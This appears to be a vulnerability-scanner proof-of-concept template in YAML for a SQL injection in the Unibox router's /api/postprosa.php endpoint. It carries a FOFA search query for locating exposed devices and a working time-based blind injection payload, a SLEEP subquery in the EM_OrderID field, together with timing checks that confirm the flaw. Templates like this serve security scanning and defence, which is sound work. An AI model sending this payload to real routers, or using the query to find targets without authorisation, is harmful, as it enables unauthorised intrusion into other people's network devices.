id: poc-yaml-unibox-router-postprosa-php-sqli
info:
  name: Unibox路由器 postprosa.php SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: unibox_administration
  fofa: body="Unibox" && body="Controller" || body="www.wifi-soft.com"
variables:
  t1: random_int(1,4)
  t2: t1 + t1 + t1
  t3: t2 + 2
requests:
- method: GET
  path: /
  expression: status_code == 200 && contains(body,"Unibox")
- method: POST
  path: /api/postprosa.php
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: EM_Digest=11&EM_Response=approved&EM_OrderID=1' AND (SELECT 1337 FROM (SELECT(SLEEP({{.t1}})))xasd)--
    -
  expression: status_code == 500 && body == "" && duration > t2 && duration < t3
transport: http
